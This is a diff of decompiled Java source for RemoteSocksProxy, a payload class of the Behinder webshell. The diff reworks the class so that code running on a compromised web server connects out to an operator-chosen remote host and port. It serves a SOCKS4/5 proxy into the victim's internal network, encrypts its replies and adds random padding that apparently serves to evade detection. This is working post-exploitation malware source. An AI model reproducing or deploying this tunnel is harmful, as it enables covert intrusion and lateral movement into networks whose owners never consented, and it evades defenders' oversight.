@@ -3,18 +3,16 @@ package net.rebeyond.behinder.payload.java;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.net.InetAddress;
-import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.nio.ByteBuffer;
 import java.nio.channels.SocketChannel;
 import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
@@ -27,11 +25,18 @@ public class RemoteSocksProxy implements Runnable {
    private Object Session;
    private int listenPort = 5555;
    private String threadType;
+   private Long threadID;
    private Map paramMap;
 
    public RemoteSocksProxy(String threadType, Map paramMap) {
       this.threadType = threadType;
       this.paramMap = paramMap;
+   }
+
+   public RemoteSocksProxy(String threadType, Map paramMap, Long threadID) {
+      this.threadType = threadType;
+      this.paramMap = paramMap;
+      this.threadID = threadID;
    }
 
    public RemoteSocksProxy() {
@@ -40,46 +45,37 @@ public class RemoteSocksProxy implements Runnable {
    public boolean equals(Object obj) {
       try {
          this.fillContext(obj);
-      } catch (Exception var30) {
+      } catch (Exception var29) {
          return true;
       }
 
       HashMap result = new HashMap();
-      boolean var22 = false;
+      boolean var21 = false;
 
       Object so;
       Method write;
       label167: {
          try {
-            var22 = true;
+            var21 = true;
             Map paramMap = new HashMap();
             paramMap.put("remoteIP", remoteIP);
             paramMap.put("remotePort", remotePort);
             paramMap.put("request", this.Request);
             paramMap.put("response", this.Response);
             paramMap.put("session", this.Session);
-            String socksServerHash = "socks_server_" + this.listenPort;
-            paramMap.put("serverSocketHash", socksServerHash);
             if (action.equals("create")) {
                try {
-                  ServerSocket serverSocket = new ServerSocket(0, 50);
-                  this.listenPort = serverSocket.getLocalPort();
-                  paramMap.put("listenPort", this.listenPort);
-                  this.sessionSetAttribute(this.Session, socksServerHash, serverSocket);
-                  serverSocket.setReuseAddress(true);
-                  (new Thread(new RemoteSocksProxy("daemon", paramMap))).start();
-                  Thread.sleep(500L);
                   (new Thread(new RemoteSocksProxy("link", paramMap))).start();
                   result.put("status", "success");
                   result.put("msg", "success");
-                  var22 = false;
-               } catch (Exception var29) {
+                  var21 = false;
+               } catch (Exception var28) {
                   result.put("status", "fail");
-                  result.put("msg", var29.getMessage());
-                  var22 = false;
+                  result.put("msg", var28.getMessage());
+                  var21 = false;
                }
             } else if (!action.equals("stop")) {
-               var22 = false;
+               var21 = false;
             } else {
                Enumeration keys = this.sessionGetAttributeNames(this.Session);
 
@@ -91,17 +87,17 @@ public class RemoteSocksProxy implements Runnable {
                      if (socket.getClass().getName().indexOf("SocketChannel") >= 0) {
                         try {
                            ((SocketChannel)socket).close();
-                        } catch (IOException var28) {
+                        } catch (IOException var27) {
                         }
                      } else if (socket.getClass().getName().indexOf("ServerSocket") >= 0) {
                         try {
                            ((ServerSocket)socket).close();
-                        } catch (IOException var27) {
+                        } catch (IOException var26) {
                         }
                      } else {
                         try {
                            ((Socket)socket).close();
-                        } catch (IOException var26) {
+                        } catch (IOException var25) {
                         }
                      }
                   }
@@ -109,23 +105,23 @@ public class RemoteSocksProxy implements Runnable {
 
                result.put("status", "success");
                result.put("msg", "success");
-               var22 = false;
+               var21 = false;
             }
             break label167;
-         } catch (Exception var31) {
+         } catch (Exception var30) {
             result.put("status", "fail");
-            result.put("msg", var31.getMessage());
-            var22 = false;
+            result.put("msg", var30.getMessage());
+            var21 = false;
          } finally {
-            if (var22) {
+            if (var21) {
                try {
                   so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                   write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
-               } catch (Exception var23) {
-                  var23.printStackTrace();
+               } catch (Exception var22) {
+                  var22.printStackTrace();
                }
 
             }
@@ -137,8 +133,8 @@ public class RemoteSocksProxy implements Runnable {
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
-         } catch (Exception var24) {
-            var24.printStackTrace();
+         } catch (Exception var23) {
+            var23.printStackTrace();
          }
 
          return true;
@@ -150,175 +146,94 @@ public class RemoteSocksProxy implements Runnable {
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
-      } catch (Exception var25) {
-         var25.printStackTrace();
+      } catch (Exception var24) {
+         var24.printStackTrace();
       }
 
       return true;
    }
 
    public void run() {
-      Object session;
-      Socket targetSocket;
-      if (this.threadType.equals("daemon")) {
-         session = this.paramMap.get("session");
-         ServerSocket serverSocket = (ServerSocket)this.sessionGetAttribute(session, this.paramMap.get("serverSocketHash").toString());
+      if (this.threadType.equals("link")) {
+         Map paramMap = new HashMap();
 
-         while(true) {
-            try {
-               targetSocket = serverSocket.accept();
-               String serverInnersocketHash = "socks_server_inner_" + targetSocket.getInetAddress().getHostAddress() + "_" + targetSocket.getPort();
-               this.paramMap.put("serverInnersocketHash", serverInnersocketHash);
-               this.sessionSetAttribute(session, serverInnersocketHash, targetSocket);
-               (new Thread(new RemoteSocksProxy("session", this.paramMap))).start();
-            } catch (Exception var17) {
-               break;
-            }
+         try {
+            long threadID = Thread.currentThread().getId();
+            Object session = this.paramMap.get("session");
+            paramMap.put("session", session);
+            Socket outerSocket = new Socket(remoteIP, Integer.parseInt(remotePort));
+            String outerSocketHash = "socks_outer_" + outerSocket.getLocalPort() + "_" + remoteIP + "_" + remotePort;
+            this.sessionSetAttribute(session, outerSocketHash, outerSocket);
+            paramMap.put("outerSocketHash", outerSocketHash);
+            (new Thread(new RemoteSocksProxy("session", paramMap))).start();
+         } catch (IOException var10) {
+            var10.printStackTrace();
          }
       } else {
-         SocketChannel remoteSocketChannel;
-         if (this.threadType.equals("link")) {
+         Object session;
+         Socket outerSocket;
+         if (this.threadType.equals("session")) {
+            session = this.paramMap.get("session");
+            outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());
+
             try {
-               session = this.paramMap.get("session");
-               String remoteIP = this.paramMap.get("remoteIP").toString();
-               int remotePort = Integer.parseInt(this.paramMap.get("remotePort").toString());
-               int listenPort = Integer.parseInt(this.paramMap.get("listenPort").toString());
-               remoteSocketChannel = SocketChannel.open();
-               remoteSocketChannel.connect(new InetSocketAddress(remoteIP, remotePort));
-               String outerSocketChannelHash = "socks_outer_" + remoteSocketChannel.socket().getLocalPort() + "_" + remoteIP + "_" + remotePort;
-               this.sessionSetAttribute(session, outerSocketChannelHash, remoteSocketChannel);
-               this.paramMap.put("outerSocketChannelHash", outerSocketChannelHash);
-               SocketChannel innerSocketChannel = SocketChannel.open();
-               innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", listenPort));
-               String innerSocketChannelHash = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
-               this.sessionSetAttribute(session, innerSocketChannelHash, innerSocketChannel);
-               this.paramMap.put("innerSocketChannelHash", innerSocketChannelHash);
-               (new Thread(new RemoteSocksProxy("linkRead", this.paramMap))).start();
-               (new Thread(new RemoteSocksProxy("linkWrite", this.paramMap))).start();
-            } catch (IOException var12) {
-               var12.printStackTrace();
+               if (this.handleSocks(outerSocket)) {
+                  Thread writer = new Thread(new RemoteSocksProxy("sessionWrite", this.paramMap));
+                  writer.start();
+                  Thread reader = new Thread(new RemoteSocksProxy("sessionRead", this.paramMap));
+                  reader.start();
+               }
+            } catch (Exception var9) {
+               var9.printStackTrace();
             }
          } else {
-            SocketChannel outerSocketChannel;
-            SocketChannel innerSocketChannel;
-            ByteBuffer buf;
+            Socket targetSocket;
+            byte[] buf;
             int bytesRead;
-            OutputStream so;
-            if (this.threadType.equals("linkRead")) {
+            if (this.threadType.equals("sessionRead")) {
                session = this.paramMap.get("session");
-               outerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("outerSocketChannelHash").toString());
-               innerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("innerSocketChannelHash").toString());
+               outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());
+               targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
+               if (outerSocket != null) {
+                  try {
+                     buf = new byte[512];
 
-               while(true) {
-                  while(true) {
-                     try {
-                        SocketChannel localSocketChannel = innerSocketChannel;
-                        buf = ByteBuffer.allocate(512);
-                        bytesRead = innerSocketChannel.read(buf);
-
-                        for(so = outerSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = localSocketChannel.read(buf)) {
-                           so.write(buf.array(), 0, bytesRead);
-                           so.flush();
-                           buf.clear();
-                        }
-
-                        so.flush();
-                        so.close();
-                     } catch (IOException var13) {
+                     for(bytesRead = targetSocket.getInputStream().read(buf); bytesRead > 0; bytesRead = targetSocket.getInputStream().read(buf)) {
+                        outerSocket.getOutputStream().write(buf, 0, bytesRead);
+                        outerSocket.getOutputStream().flush();
                      }
+                  } catch (Exception var11) {
+                     var11.printStackTrace();
+                  }
+
+                  try {
+                     outerSocket.close();
+                     targetSocket.close();
+                  } catch (Exception var8) {
+                     var8.printStackTrace();
                   }
                }
-            }
-
-            if (this.threadType.equals("linkWrite")) {
+            } else if (this.threadType.equals("sessionWrite")) {
                session = this.paramMap.get("session");
-               outerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("outerSocketChannelHash").toString());
-               innerSocketChannel = (SocketChannel)this.sessionGetAttribute(session, this.paramMap.get("innerSocketChannelHash").toString());
+               outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());
+               targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
+               if (outerSocket != null) {
+                  try {
+                     buf = new byte[512];
 
-               while(true) {
-                  while(true) {
-                     try {
-                        remoteSocketChannel = outerSocketChannel;
-                        buf = ByteBuffer.allocate(512);
-                        bytesRead = outerSocketChannel.read(buf);
-
-                        for(so = innerSocketChannel.socket().getOutputStream(); bytesRead > 0; bytesRead = remoteSocketChannel.read(buf)) {
-                           so.write(buf.array(), 0, bytesRead);
-                           so.flush();
-                           buf.clear();
-                        }
-
-                        so.flush();
-                        so.close();
-                     } catch (IOException var14) {
+                     for(bytesRead = outerSocket.getInputStream().read(buf); bytesRead > 0; bytesRead = outerSocket.getInputStream().read(buf)) {
+                        targetSocket.getOutputStream().write(buf, 0, bytesRead);
+                        targetSocket.getOutputStream().flush();
                      }
+                  } catch (Exception var12) {
+                     var12.printStackTrace();
                   }
-               }
-            }
 
-            Socket serverInnersocket;
-            if (this.threadType.equals("session")) {
-               session = this.paramMap.get("session");
-               serverInnersocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("serverInnersocketHash").toString());
-
-               try {
-                  if (this.handleSocks(serverInnersocket)) {
-                     Thread writer = new Thread(new RemoteSocksProxy("sessionWrite", this.paramMap));
-                     writer.start();
-                     Thread reader = new Thread(new RemoteSocksProxy("sessionRead", this.paramMap));
-                     reader.start();
-                     (new Thread(new RemoteSocksProxy("link", this.paramMap))).start();
-                  }
-               } catch (Exception var11) {
-                  var11.printStackTrace();
-               }
-            } else {
-               byte[] bufs;
-               if (this.threadType.equals("sessionRead")) {
-                  session = this.paramMap.get("session");
-                  serverInnersocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("serverInnersocketHash").toString());
-                  targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
-                  if (serverInnersocket != null) {
-                     try {
-                        bufs = new byte[512];
-
-                        for(bytesRead = targetSocket.getInputStream().read(bufs); bytesRead > 0; bytesRead = targetSocket.getInputStream().read(bufs)) {
-                           serverInnersocket.getOutputStream().write(bufs, 0, bytesRead);
-                           serverInnersocket.getOutputStream().flush();
-                        }
-                     } catch (Exception var15) {
-                        var15.printStackTrace();
-                     }
-
-                     try {
-                        serverInnersocket.close();
-                        targetSocket.close();
-                     } catch (Exception var10) {
-                        var10.printStackTrace();
-                     }
-                  }
-               } else if (this.threadType.equals("sessionWrite")) {
-                  session = this.paramMap.get("session");
-                  serverInnersocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("serverInnersocketHash").toString());
-                  targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
-                  if (serverInnersocket != null) {
-                     try {
-                        bufs = new byte[512];
-
-                        for(bytesRead = serverInnersocket.getInputStream().read(bufs); bytesRead > 0; bytesRead = serverInnersocket.getInputStream().read(bufs)) {
-                           targetSocket.getOutputStream().write(bufs, 0, bytesRead);
-                           targetSocket.getOutputStream().flush();
-                        }
-                     } catch (Exception var16) {
-                        var16.printStackTrace();
-                     }
-
-                     try {
-                        serverInnersocket.close();
-                        targetSocket.close();
-                     } catch (Exception var9) {
-                        var9.printStackTrace();
-                     }
+                  try {
+                     outerSocket.close();
+                     targetSocket.close();
+                  } catch (Exception var7) {
+                     var7.printStackTrace();
                   }
                }
             }
@@ -329,6 +244,7 @@ public class RemoteSocksProxy implements Runnable {
 
    private boolean handleSocks(Socket socket) throws Exception {
       int ver = socket.getInputStream().read();
+      (new Thread(new RemoteSocksProxy("link", this.paramMap))).start();
       if (ver == 5) {
          return this.parseSocks5(socket);
       } else {
@@ -380,8 +296,8 @@ public class RemoteSocksProxy implements Runnable {
          temp = tempArray.length;
 
          for(int var16 = 0; var16 < temp; ++var16) {
-            String tempstr = var23[var16];
-            host = host + tempstr + ".";
+            String tempp = var23[var16];
+            host = host + tempp + ".";
          }
 
          host = host.substring(0, host.length() - 1);
@@ -554,5 +470,18 @@ public class RemoteSocksProxy implements Runnable {
       } catch (Exception var4) {
       }
 
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
